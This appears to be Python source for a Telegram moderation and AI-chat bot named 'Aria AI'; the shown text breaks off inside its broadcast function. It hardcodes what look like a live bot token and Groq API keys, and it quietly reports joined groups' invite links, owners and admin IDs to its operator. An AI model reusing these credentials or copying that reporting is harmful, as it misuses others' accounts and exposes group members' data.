import logging
import json
import os
import html
import requests
import asyncio
import re
import random
from datetime import datetime, timedelta, timezone
from collections import defaultdict, deque
from telegram import (
    Update, ChatPermissions, InlineKeyboardButton, InlineKeyboardMarkup,
    BotCommand, BotCommandScopeDefault, BotCommandScopeChatMember
)
from telegram.constants import ChatAction
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler,
    filters, CallbackQueryHandler, ChatMemberHandler
)

# ================= CONFIGURATION =================
BOT_TOKEN = "8937996187:AAEK-lwb0smu1nZXq0CYSJQCfFpK0uQGLE0"
GROUP_ID = -1004289129950
MONITOR_GROUP_ID = -1003885034094  # All available activity from this group is sent to fixed admin(s).

OFFICIAL_GROUP_LINK = "https://t.me/AriaGroupofficial"
BOT_USERNAME = "AriaGroupofficial_Bot"

GROQ_API_KEYS = [
    "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",
    "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",
    "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"
]

MEDICAL_POSTER = "https://your-image-link.com/medical.jpg"
ADMIN_POSTER = "https://your-image-link.com/admin.jpg"
DEFAULT_WELCOME_VIDEO = "BAACAgUAAxkBAAEh83FqjJv_1QestjBknrtIxBbBdo72CgAC4CEAAupSkVdMBjplZgnNjj0E"

BOT_NAME = "Aria AI"
MEMORY_SIZE = 10

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ================= MEMORY STORAGE =================
WARNS = {}
ANTILINK = {}
ANTIFLOOD = {}
AI_MODE = {}
WELCOME = {}
LINK_COUNT = {}
USER_MEMORY = defaultdict(lambda: deque(maxlen=MEMORY_SIZE * 2))
REACTION_MODE = {}

# ================= ADMIN / PERSISTENT DATA =================
# Add fixed Telegram user IDs here if you want permanent bot-owner access.
FIXED_ADMIN_IDS = {8952615815}
ADMIN_IDS = set(FIXED_ADMIN_IDS)
DATA_FILE = "aria_bot_data.json"
KNOWN_USERS = set()
KNOWN_GROUPS = {}
PENDING_BROADCAST = set()

def load_bot_data():
    global KNOWN_USERS, KNOWN_GROUPS, DEFAULT_WELCOME_VIDEO, ADMIN_IDS
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        KNOWN_USERS = {int(x) for x in data.get("users", [])}
        KNOWN_GROUPS = data.get("groups", {})
        # Admin access is fixed in the source code; saved data cannot override it.
        ADMIN_IDS = set(FIXED_ADMIN_IDS)
        if data.get("welcome_video"):
            DEFAULT_WELCOME_VIDEO = data["welcome_video"]
    except Exception:
        KNOWN_USERS = set()
        KNOWN_GROUPS = {}
        ADMIN_IDS = set(FIXED_ADMIN_IDS)

def save_bot_data():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({"users": sorted(KNOWN_USERS), "groups": KNOWN_GROUPS, "admins": sorted(ADMIN_IDS), "welcome_video": DEFAULT_WELCOME_VIDEO}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.warning(f"Data save failed: {e}")

def remember_user(user_id):
    if user_id:
        KNOWN_USERS.add(int(user_id))
        save_bot_data()

def remember_group(chat):
    if not chat or chat.type not in ("group", "supergroup"):
        return
    KNOWN_GROUPS[str(chat.id)] = {
        "id": chat.id,
        "title": chat.title or "Untitled group",
        "type": chat.type,
        "username": getattr(chat, "username", None),
        "updated": datetime.now(timezone.utc).isoformat(),
    }
    save_bot_data()

# ================= BAD CONTENT =================
BAD_WORDS = [
    "fuck", "bitch", "asshole", "bastard", "dick", "pussy", "sex", "xxx",
    "madarchod", "bhenchod", "chutiya", "gandu", "harami", "kutta", "kamina",
    "bsdk", "mc", "bc", "randi", "bhosdike", "lund", "choda"
]
BAD_EMOJIS = ["🖕", "🤬", "💩", "🔞", "🍆", "🍑", "👅", "💦", "🩸"]

# ================= AUTO REACTION RULES =================
REACTION_RULES = [
    (["hello", "hi", "hey", "hola", "assalam", "salam", "namaste", "নমস্কার", "হ্যালো", "হাই", "kemon", "কেমন"], ["👋", "😊", "🥰", "❤️"]),
    (["thank", "thanks", "thx", "shukriya", "ধন্যবাদ", "tnx"], ["🙏", "❤️", "💖", "🥰"]),
    (["love", "i love you", "prem", "ভালোবাসি", "প্ৰেম"], ["❤️", "😍", "🥰", "💖", "💘"]),
    (["haha", "lol", "lmao", "হাসি", "হাহা", "মজা"], ["😂", "🤣", "😆", "😹"]),
    (["congrats", "congratulation", "অভিনন্দন", "মুবারক", "mubarak"], ["🎉", "🎊", "🥳", "👏"]),
    (["sad", "dukkho", "দুঃখ", "কষ্ট", "মন খারাপ", "cry"], ["😢", "😭", "💔"]),
    (["how", "why", "what", "when", "where", "?", "কি", "কেন", "কিভাবে"], ["🤔", "🧐", "❓"]),
    (["wow", "omg", "কি দারুন", "অবাক", "surprise"], ["😮", "🤯", "😲"]),
    (["fire", "awesome", "great", "best", "সেরা", "দারুন", "op"], ["🔥", "💯", "👏", "⚡"]),
    (["angry", "রাগ", "গোস্বা", "hate", "ঘৃণা"], ["😡", "🤬", "😠"]),
    (["scared", "ভয়", "ভয় লাগছে", "afraid"], ["😱", "😨", "😰"]),
    (["respect", "শ্রদ্ধা", "salute", "সালাম"], ["🫡", "🙏", "❤️"]),
    (["good night", "শুভ রাত্রি", "gn"], ["🌙", "😴", "💤"]),
    (["good morning", "শুভ সকাল", "gm"], ["☀️", "🌅", "😊"]),
    (["happy", "খুশি", "আনন্দ"], ["😄", "😁", "🥰", "🎉"]),
    (["proud", "গর্ব"], ["🥹", "❤️", "👏"]),
    (["ok", "okay", "ঠিক", "আচ্ছা", "হুম"], ["👍", "👌", "✅"]),
    (["bye", "goodbye", "বিদায়"], ["👋", "😢", "🤗"]),
    (["sorry", "দুঃখিত", "মাফ"], ["🙏", "😔"]),
]

def pick_reaction(text: str):
    if not text:
        return None
    lower = text.lower()
    matched = []
    for keywords, emojis in REACTION_RULES:
        for kw in keywords:
            if kw in lower:
                matched.extend(emojis)
                break
    if matched:
        return random.choice(matched)
    return random.choice(["👍", "❤️", "😊", "🔥", "💯", "😍", "👏", "🎉"])

# ================= AI FUNCTION =================
def get_ai_reply(user_id: int, user_message: str, mode="chat"):
    url = "https://api.groq.com/openai/v1/chat/completions"
    system_prompts = {
        "chat": (
            f"You are {BOT_NAME}, a helpful AI assistant. "
            "VERY IMPORTANT: Detect the user's language and ALWAYS reply in the SAME language. "
            "If they write in Bangla, reply in Bangla. If English, reply in English. If Hindi, reply in Hindi. "
            "Be friendly and helpful. "
            f"If someone asks your name, say your name is {BOT_NAME}. "
            "Remember the previous conversation and respond naturally."
        ),
        "code": "You are an expert Code Developer AI. Generate COMPLETE working code with all files."
    }
    messages = [{"role": "system", "content": system_prompts.get(mode, system_prompts["chat"])}]
    for msg in USER_MEMORY[user_id]:
        messages.append(msg)
    messages.append({"role": "user", "content": user_message})

    payload = {"model": "openai/gpt-oss-20b", "messages": messages}
    for key in GROQ_API_KEYS:
        try:
            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {key}"}
            response = requests.post(url, json=payload, headers=headers, timeout=60)
            result = response.json()
            if "choices" in result and len(result["choices"]) > 0:
                reply = result["choices"][0]["message"]["content"]
                USER_MEMORY[user_id].append({"role": "user", "content": user_message})
                USER_MEMORY[user_id].append({"role": "assistant", "content": reply})
                return reply
        except Exception:
            continue
    return None

# ================= HELPER =================
async def is_global_admin(user_id, context):
    # Global/admin-panel access is ONLY for the two fixed IDs in source code.
    return bool(user_id and int(user_id) in FIXED_ADMIN_IDS)

async def admin_only(update, context):
    user = update.effective_user
    if not user or not await is_global_admin(user.id, context):
        if update.message:
            await update.message.reply_text("❌ Admin only!")
        return False
    remember_user(user.id)
    return True

async def get_group_link(context, chat):
    if getattr(chat, "username", None):
        return f"https://t.me/{chat.username}"
    try:
        return await context.bot.export_chat_invite_link(chat.id)
    except Exception:
        return "Private link unavailable (bot needs invite permission)"

async def is_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allow the group owner/administrators to use moderation commands.
    The separate /admin panel remains restricted to FIXED_ADMIN_IDS.
    """
    user = update.effective_user
    chat = update.effective_chat
    if not user or not chat or chat.type not in ("group", "supergroup"):
        return False
    if user.id in FIXED_ADMIN_IDS:
        return True
    try:
        member = await context.bot.get_chat_member(chat.id, user.id)
        return member.status in ("administrator", "creator")
    except Exception as e:
        logging.warning(f"Could not check group admin status: {e}")
        return False

async def is_user_joined(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    try:
        member = await context.bot.get_chat_member(GROUP_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def contains_bad_content(text: str):
    if not text:
        return False
    lower = text.lower()
    for w in BAD_WORDS:
        if w in lower:
            return True
    for e in BAD_EMOJIS:
        if e in text:
            return True
    return False

def message_has_link(update: Update):
    """Detect URLs, Telegram links, usernames and common pasted IDs."""
    msg = update.message
    if not msg:
        return False

    for ent in (msg.entities or []):
        if ent.type in ("url", "text_link"):
            return True
    for ent in (msg.caption_entities or []):
        if ent.type in ("url", "text_link"):
            return True

    raw = " ".join(x for x in (msg.text or "", msg.caption or "") if x).strip()
    if not raw:
        return False

    normalized = re.sub(r"\s+", "", raw).lower()

    patterns = [
        r"https?://",
        r"ftp://",
        r"www\.",
        r"\bt\.me/",
        r"\btelegram\.me/",
        r"\btelegram\.dog/",
        r"(?<![\w])@[a-z0-9_]{4,}(?![\w])",
        r"\b[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.[a-z]{2,63}(?:[/?:#][^\s<>]*)?",
        r"(?<!\d)\+?\d{10,15}(?!\d)",
        r"(?<!\d)\d{5,}(?!\d)",
    ]

    return any(re.search(p, normalized, re.IGNORECASE) for p in patterns) or any(
        phrase in raw.lower()
        for phrase in (
            "join chat", "join group", "join channel",
            "click here", "click this", "view channel",
            "open link", "visit link", "download link",
        )
    )

def user_mention_html(user):
    name = user.first_name or "User"
    return f'<a href="tg://user?id={user.id}">{name}</a>'

# ================= KEYBOARD =================
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add to Group 💖", url=f"https://t.me/{BOT_USERNAME}?startgroup=true")]
    ])

def join_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Join Group 💖", url=OFFICIAL_GROUP_LINK)],
        [InlineKeyboardButton("✅ I Have Joined 💖", callback_data="success_join")]
    ])

# ================= WELCOME VIDEO HELPER =================
async def send_welcome_video(target_message, context, caption, reply_markup=None, chat_id=None):
    """Send the configured Telegram video with a caption; fall back to text if video fails."""
    try:
        if target_message is not None:
            return await target_message.reply_video(
                video=DEFAULT_WELCOME_VIDEO,
                caption=caption,
                reply_markup=reply_markup,
            )
        return await context.bot.send_video(
            chat_id=chat_id,
            video=DEFAULT_WELCOME_VIDEO,
            caption=caption,
            reply_markup=reply_markup,
        )
    except Exception as e:
        logging.warning(f"Welcome video send failed: {e}")
        if target_message is not None:
            return await target_message.reply_text(caption, reply_markup=reply_markup)
        return await context.bot.send_message(
            chat_id=chat_id,
            text=caption,
            reply_markup=reply_markup,
        )

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    remember_user(user.id)
    joined = await is_user_joined(context, user.id)

    if joined:
        caption = (
            f"👋 Hello {user.first_name}!\n\n"
            "✅ You are already a member of our official group!\n"
            "🎬 Welcome video is below.\n\n"
            "📌 Want to use me in your own group?\n"
            "Tap the button below 👇"
        )
        await send_welcome_video(
            update.message,
            context,
            caption,
            reply_markup=main_keyboard(),
        )
    else:
        await update.message.reply_text(
            "⚠️ You must join our official group first!\n\n"
            "1️⃣ Tap the 'Join Group' button below\n"
            "2️⃣ After joining, tap 'I Have Joined' ✅",
            reply_markup=join_keyboard()
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = query.from_user
    remember_user(user.id)

    if query.data == "success_join":
        joined = await is_user_joined(context, user_id)
        if joined:
            try:
                await query.message.delete()
            except:
                pass
            caption = (
                f"🎉 Thank you for joining, {user.first_name}!\n\n"
                "✅ Join successful!\n"
                "🎬 Your welcome video is below.\n\n"
                "📌 Want to add me to your own group?\n"
                "👇 Tap the button below"
            )
            await send_welcome_video(
                query.message,
                context,
                caption,
                reply_markup=main_keyboard(),
            )
        else:
            await query.message.reply_text(
                "❌ You haven't joined yet! Please join first.",
                reply_markup=join_keyboard()
            )
    elif query.data.startswith("admin_"):
        await admin_callback(query, context)

# ================= AUTO REACTION (SKIPS LINKS) =================
async def auto_reaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    chat_id = update.effective_chat.id
    if not REACTION_MODE.get(chat_id, True):
        return

    # skip link messages (they will be deleted)
    if message_has_link(update):
        return

    text = update.message.text or update.message.caption or ""
    if not text.strip():
        return

    emoji = pick_reaction(text)
    if not emoji:
        return
    try:
        await update.message.set_reaction(emoji)
    except Exception:
        pass

# ================= AI CHAT — NO loading message =================
async def reaction_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable/disable automatic emoji reactions for the current chat."""
    if not await is_admin(update, context):
        if update.message:
            await update.message.reply_text("❌ Admin only!")
        return
    chat_id = update.effective_chat.id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        REACTION_MODE[chat_id] = True
        await update.message.reply_text("😀 Auto reactions enabled.")
    elif arg == "off":
        REACTION_MODE[chat_id] = False
        await update.message.reply_text("❌ Auto reactions disabled.")
    else:
        current = "ON" if REACTION_MODE.get(chat_id, True) else "OFF"
        await update.message.reply_text(
            f"😀 Auto reaction is currently <b>{current}</b>.\n\nUsage: /reaction on OR /reaction off",
            parse_mode="HTML"
        )

async def ai_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not update.message or not update.message.text:
        return
    user_text = update.message.text.strip()
    user = update.message.from_user
    if not user or user_text.startswith("/"):
        return
    if not AI_MODE.get(chat_id, False):
        return
    if message_has_link(update):
        return

    # Show "typing..." in chat header (no visible message)
    try:
        await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
    except Exception:
        pass

    ai_response = get_ai_reply(user.id, user_text, mode="chat")
    if ai_response:
        await update.message.reply_text(ai_response)

async def clearmemory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in USER_MEMORY:
        USER_MEMORY[user.id].clear()
    await update.message.reply_text(f"🧠 {user.first_name}, your chat memory has been cleared!")

# ================= BOT ADDED TO GROUP =================
async def bot_added_to_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message or not message.new_chat_members:
        return
    for member in message.new_chat_members:
        if member.id != context.bot.id:
            continue
        chat = update.effective_chat
        remember_group(chat)
        adder = message.from_user
        try:
            admins = await context.bot.get_chat_administrators(chat.id)
        except Exception:
            admins = []
        owner = next((a for a in admins if a.status == 'creator'), None)
        admin_lines = []
        for a in admins[:30]:
            role = 'OWNER' if a.status == 'creator' else 'ADMIN'
            name = html.escape(a.user.full_name or a.user.first_name or 'User')
            admin_lines.append(f'• {name} — {role} — <code>{a.user.id}</code>')
        try:
            member_count = await context.bot.get_chat_member_count(chat.id)
        except Exception:
            member_count = 'Unavailable'
        link = await get_group_link(context, chat)
        try:
            me = await context.bot.get_chat_member(chat.id, context.bot.id)
            perms = [label for attr, label in (("can_delete_messages", "delete"), ("can_restrict_members", "restrict"), ("can_invite_users", "invite"), ("can_pin_messages", "pin"), ("can_manage_chat", "manage")) if getattr(me, attr, False)]
            bot_status = me.status
        except Exception:
            perms, bot_status = [], 'unknown'

        admin_report = (
            '🚨 <b>BOT ADDED TO A GROUP</b>\n\n'
            f'🏷️ <b>{html.escape(chat.title or "Untitled group")}</b>\n'
            f'🆔 Group ID: <code>{chat.id}</code>\n'
            f'🔗 Group link: {html.escape(link)}\n'
            f'👥 Members: <b>{member_count}</b>\n'
            f'➕ Added by: {html.escape(adder.full_name if adder else "Unknown")} ' + (f'(<code>{adder.id}</code>)' if adder else '') + '\n'
            f'👑 Owner: {html.escape(owner.user.full_name) if owner else "Unknown"}' + (f' (<code>{owner.user.id}</code>)' if owner else '') + '\n'
            f'🤖 Bot status: <b>{html.escape(str(bot_status))}</b>\n'
            f'🛡️ Bot permissions: {", ".join(perms) if perms else "none/check required"}\n\n'
            '👮 <b>Current group admins:</b>\n' + ('\n'.join(admin_lines) if admin_lines else '• None')
        )
        await send_admin_log(context, admin_report)
        await send_monitor_text(context, admin_report, source='GROUP ADDED')

        try:
            commands = [
                BotCommand('start', '🚀 Start & check join'), BotCommand('help', '❓ Show all commands'),
                BotCommand('clearmemory', '🧠 Clear your AI chat memory'), BotCommand('reaction', '😀 Auto reactions on/off'),
                BotCommand('kick', '👢 Kick a user'), BotCommand('ban', '🚫 Ban a user'), BotCommand('mute', '🔇 Mute a user'),
                BotCommand('unmute', '🔊 Unmute a user'), BotCommand('warn', '⚠️ Warn a user'), BotCommand('warns', '📊 Check warnings'),
                BotCommand('clearwarns', '✅ Clear warnings'), BotCommand('purge', '🧹 Delete messages'), BotCommand('pin', '📌 Pin silently'),
                BotCommand('pinloud', '📢 Pin with notification'), BotCommand('allon', '✅ Turn ON all features'),
                BotCommand('alloff', '❌ Turn OFF all features'), BotCommand('antilink', '🔗 Antilink on/off'),
                BotCommand('setwelcome', '👋 Set welcome message')]
            for adm in admins:
                await context.bot.set_my_commands(commands, scope=BotCommandScopeChatMember(chat_id=chat.id, user_id=adm.user.id))
        except Exception as e:
            logging.warning(f'Could not set admin command menu for {chat.id}: {e}')

        caption = (
            f'🎉 Thank you {html.escape(adder.first_name if adder else "there")} for adding me to <b>{html.escape(chat.title or "this group")}</b>!\n\n'
            '🎬 Welcome video is below.\n\n'
            "✨ <b>I'm your new AI assistant.</b>\n"
            '🤖 AI replies\n🔗 Auto link protection\n⚠️ Warn / mute / ban\n'
            '🎉 Welcome new members\n😀 Auto reactions\n🧠 Per-user memory\n\n'
            '📌 Use /help to see all available commands.' )
        try:
            await context.bot.send_video(chat_id=chat.id, video=DEFAULT_WELCOME_VIDEO, caption=caption, parse_mode='HTML')
        except Exception as e:
            logging.warning(f'Bot-added welcome video failed: {e}')
            try: await context.bot.send_message(chat_id=chat.id, text=caption, parse_mode='HTML')
            except Exception: pass

# ================= LINK FILTER — INSTANT DELETE =================
async def short_mute(context, chat_id, user_id, user_name, seconds=20):
    """Mute for exactly `seconds`, then explicitly unmute.
    Do not rely on Telegram's until_date for the final unmute.
    """
    mention = f'<a href="tg://user?id={user_id}">{user_name}</a>'
    mute_perms = ChatPermissions(can_send_messages=False)

    try:
        await context.bot.restrict_chat_member(
            chat_id=chat_id,
            user_id=user_id,
            permissions=mute_perms,
            # Telegram gets the same exact UTC 20-second expiry as a fallback;
            # the bot also explicitly unmutes after the timer.
            until_date=datetime.now(timezone.utc) + timedelta(seconds=seconds),
        )
    except Exception as e:
        logging.warning(f"Mute failed: {e}")
        return

    try:
        status_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔇 {mention} muted for <b>{seconds}s</b>\n⏳ Countdown: <b>{seconds}s</b>",
            parse_mode="HTML",
        )
    except Exception:
        status_msg = None

    # Exactly 20 seconds from the moment the restriction was applied.
    for remaining in range(seconds - 1, -1, -1):
        await asyncio.sleep(1)
        if status_msg:
            try:
                if remaining > 0:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        text=f"🔇 {mention} muted for <b>{seconds}s</b>\n⏳ Countdown: <b>{remaining}s</b>",
                        parse_mode="HTML",
                    )
                else:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        text=f"🔊 {mention} mute time finished — unmuting now!",
                        parse_mode="HTML",
                    )
            except Exception:
                pass

    # Force-unmute after 20 seconds. No until_date is used here.
    try:
        await context.bot.restrict_chat_member(
            chat_id=chat_id,
            user_id=user_id,
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_audios=True,
                can_send_documents=True,
                can_send_photos=True,
                can_send_videos=True,
                can_send_video_notes=True,
                can_send_voice_notes=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
                can_change_info=False,
                can_invite_users=True,
                can_pin_messages=False,
                can_manage_topics=False,
            ),
        )
        logging.info(f"Unmuted user {user_id} in chat {chat_id} after {seconds}s")
        try:
            success_msg = await context.bot.send_message(chat_id=chat_id, text=f"🔊 <b>UNMUTE SUCCESS</b>\n\n👤 {mention}\n✅ 20-second mute finished. You can send messages again.", parse_mode="HTML")
            await asyncio.sleep(3)
            await context.bot.delete_message(chat_id=chat_id, message_id=success_msg.message_id)
        except Exception:
            pass
        if status_msg:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=status_msg.message_id)
            except Exception:
                pass
    except Exception as e:
        logging.warning(f"Unmute failed for chat={chat_id}, user={user_id}: {e}")
        return


async def bot_status_changed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Track bot promotion/demotion/removal in groups."""
    cm = update.my_chat_member
    if not cm or not cm.chat or cm.chat.type not in ("group", "supergroup"):
        return
    chat = cm.chat
    old_status = cm.old_chat_member.status
    new_status = cm.new_chat_member.status
    remember_group(chat)
    if old_status == new_status:
        return
    labels = {"creator":"OWNER", "administrator":"ADMIN", "member":"MEMBER", "restricted":"RESTRICTED", "left":"LEFT", "kicked":"KICKED"}
    old_label = labels.get(old_status, str(old_status).upper())
    new_label = labels.get(new_status, str(new_status).upper())
    actor = cm.from_user
    actor_text = f"{html.escape(actor.full_name or actor.first_name or 'Unknown')} (<code>{actor.id}</code>)" if actor else "Unknown"
    link = await get_group_link(context, chat)
    report = (f"🔄 <b>BOT GROUP STATUS CHANGED</b>\n\n"
              f"🏷️ Group: <b>{html.escape(chat.title or 'Untitled group')}</b>\n"
              f"🆔 ID: <code>{chat.id}</code>\n"
              f"🔗 Link: {html.escape(link)}\n"
              f"🔄 Status: <b>{old_label}</b> → <b>{new_label}</b>\n"
              f"👤 Changed by: {actor_text}")
    if new_status in ("administrator", "creator"):
        try:
            admins = await context.bot.get_chat_administrators(chat.id)
            owner = next((a for a in admins if a.status == "creator"), None)
            count = await context.bot.get_chat_member_count(chat.id)
            me = await context.bot.get_chat_member(chat.id, context.bot.id)
            perms = [label for attr, label in (("can_delete_messages","delete"),("can_restrict_members","restrict"),("can_invite_users","invite"),("can_pin_messages","pin"),("can_manage_chat","manage")) if getattr(me, attr, False)]
            admin_lines = [f"• {html.escape(a.user.full_name or a.user.first_name or 'User')} — {'OWNER' if a.status == 'creator' else 'ADMIN'} — <code>{a.user.id}</code>" for a in admins[:30]]
            report += (f"\n👥 Members: <b>{count}</b>\n"
                       f"👑 Owner: {html.escape(owner.user.full_name) if owner else 'Unknown'}" + (f" (<code>{owner.user.id}</code>)" if owner else "") + "\n"
                       f"🤖 Bot permissions: {', '.join(perms) if perms else 'none/check required'}\n\n"
                       "👮 <b>Current admins:</b>\n" + ("\n".join(admin_lines) if admin_lines else "• None"))
        except Exception as e:
            report += f"\n⚠️ Details unavailable: <code>{html.escape(str(e))[:700]}</code>"
    await send_admin_log(context, report)
    await send_monitor_text(context, report, source="GROUP STATUS")
    if new_status == "administrator":
        try:
            await context.bot.send_message(chat.id, "🤖 <b>Bot admin access detected!</b>\n\n✅ I am now an administrator in this group.\n🛡️ Moderation, link protection, welcome, reactions and AI features are ready.\n📌 Use /help to see all commands.", parse_mode="HTML")
        except Exception as e:
            logging.warning(f"Could not notify group after promotion: {e}")

async def link_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Moderate links/IDs from normal users; admins/creator are exempt."""
    msg = update.message
    if not msg:
        return

    chat = update.effective_chat
    user = msg.from_user
    if not chat or not user:
        return

    # Only groups/supergroups need this moderation.
    if chat.type not in ("group", "supergroup"):
        return

    # Admins and the creator are never filtered.
    try:
        member = await context.bot.get_chat_member(chat.id, user.id)
        if member.status in ("administrator", "creator"):
            return
    except Exception as e:
        logging.warning(f"Could not check member status: {e}")
        # Fail closed for ordinary users: continue moderation.

    text = f"{msg.text or ''} {msg.caption or ''}"
    has_link = message_has_link(update)
    has_bad = contains_bad_content(text)

    # Respect /antilink off for links, but keep the existing bad-word filter.
    antilink_enabled = ANTILINK.get(chat.id, True)
    if not has_bad and not (has_link and antilink_enabled):
        return

    # Delete the offending message immediately.
    try:
        await context.bot.delete_message(chat.id, msg.message_id)
        logging.info(f"Deleted moderated message {msg.message_id} from {user.id}")
    except Exception as e:
        logging.warning(f"Delete failed for chat={chat.id}, msg={msg.message_id}: {e}")

    mention = user_mention_html(user)

    if has_link and antilink_enabled:
        per_chat = LINK_COUNT.setdefault(chat.id, {})
        count = per_chat.get(user.id, 0) + 1
        per_chat[user.id] = count

        if count >= 2:
            per_chat[user.id] = 0

            try:
                await context.bot.send_message(
                    chat_id=chat.id,
                    text=(
                        f"🚫 <b>LINK / ID DETECTED</b>\n\n"
                        f"👤 {mention}\n"
                        f"🗑️ Message deleted.\n"
                        f"🔇 2nd offense — 20-second mute."
                    ),
                    parse_mode="HTML",
                )
            except Exception:
                pass

            await short_mute(
                context, chat.id, user.id, user.first_name or "User", seconds=20
            )
        else:
            try:
                await context.bot.send_message(
                    chat_id=chat.id,
                    text=(
                        f"⚠️ <b>LINK / ID DETECTED</b>\n\n"
                        f"👤 {mention}\n"
                        f"🗑️ Message deleted immediately.\n"
                        f"📌 Warning: <b>1/2</b>\n"
                        f"🔇 Next link/ID = 20-second mute."
                    ),
                    parse_mode="HTML",
                )
            except Exception:
                pass
    elif has_bad:
        try:
            await context.bot.send_message(
                chat_id=chat.id,
                text=(
                    f"⚠️ <b>BAD LANGUAGE DETECTED!</b>\n\n"
                    f"👤 {mention}\n"
                    f"🚫 Message deleted. Please keep it clean!"
                ),
                parse_mode="HTML",
            )
        except Exception:
            pass

# ================= ADMIN MANAGEMENT =================
async def admins_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    await update.message.reply_text(
        "👑 <b>Fixed Bot Admins</b>\n\n"
        + "\n".join(f"👑 <code>{admin_id}</code>" for admin_id in sorted(FIXED_ADMIN_IDS)),
        parse_mode="HTML"
    )

# ================= ADMIN PANEL =================
def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"), InlineKeyboardButton("🎬 Video ID", callback_data="admin_video")],
        [InlineKeyboardButton("📢 Promotion / Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("👥 My Groups & Details", callback_data="admin_groups")],
        [InlineKeyboardButton("📋 Admin List", callback_data="admin_list")],
        [InlineKeyboardButton("⚙️ Group Settings", callback_data="admin_settings"), InlineKeyboardButton("🆔 My ID", callback_data="admin_myid")],
        [InlineKeyboardButton("❌ Close", callback_data="admin_close")],
    ])

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    await update.message.reply_text(
        "👑 <b>Aria AI — Admin Panel</b>\n\n"
        "🎬 Welcome video: configurable by Telegram file_id\n"
        "📢 Promotion: broadcast to users who have started/chatted with the bot\n"
        "👥 Groups: title, ID, public/private link, admins/owner and bot permissions\n"
        "📡 Monitor Group: activity logs sent to fixed admins\n"
        "⚙️ Settings: quick group feature status\n"
        "👑 Admins: fixed in source code\n\n"
        "Choose an option below:",
        parse_mode="HTML",
        reply_markup=admin_keyboard(),
    )

async def videoid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    await update.message.reply_text(
        f"🎬 <b>Current Welcome Video ID</b>\n<code>{html.escape(DEFAULT_WELCOME_VIDEO)}</code>\n\n"
        "To replace it: reply to a Telegram video with /setvideo, or use /setvideo &lt;file_id&gt;.",
        parse_mode="HTML",
    )

async def setvideo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global DEFAULT_WELCOME_VIDEO
    if not await admin_only(update, context):
        return
    file_id = None
    if update.message.reply_to_message and update.message.reply_to_message.video:
        file_id = update.message.reply_to_message.video.file_id
    elif context.args:
        file_id = context.args[0].strip()
    if not file_id:
        return await update.message.reply_text(
            "🎬 <b>Video সেট করতে</b>\n\n"
            "1️⃣ Bot-এ video পাঠাও\n"
            "2️⃣ ওই video-তে reply করে <code>/setvideo</code> দাও\n\n"
            "অথবা:\n<code>/setvideo VIDEO_FILE_ID</code>",
            parse_mode="HTML",
        )
    # Validate the ID by asking Telegram for the file.
    try:
        await context.bot.get_file(file_id)
    except Exception:
        return await update.message.reply_text("❌ এই video file_id কাজ করছে না। সঠিক Telegram video ID দাও।")
    DEFAULT_WELCOME_VIDEO = file_id
    save_bot_data()
    await update.message.reply_text(
        "✅ <b>Welcome video updated!</b>\n\n"
        f"🎬 ID: <code>{html.escape(file_id)}</code>\n\n"
        "এখন /start, Join Success এবং group welcome—তিন জায়গাতেই এই video দেখাবে।",
        parse_mode="HTML",
    )

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    text = " ".join(context.args).strip()
    if not text:
        PENDING_BROADCAST.add(update.effective_user.id)
        return await update.message.reply_text(
            "📢 <b>Promotion Broadcast</b>\n\n"
            "এখন পরের message-এ যে promotion text পাঠাবে, সেটা bot-এর পরিচিত users-দের কাছে যাবে।\n\n"
            "Cancel করতে /cancelbroadcast দাও।",
            parse_mode="HTML",
        )
    await do_broadcast(update, context, text)

async def cancel_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    PENDING_BROADCAST.discard(update.effective_user.id)
    await update.message.reply_text("❌ Broadcast cancelled.")

async def do_broadcast(update, context, text):
    PENDING_BROADCAST.discard(update.effective_user.id)
    sent = failed = 0
    for uid in list(KNOWN_USERS):
        if uid == update.effective_user.id:
            continue
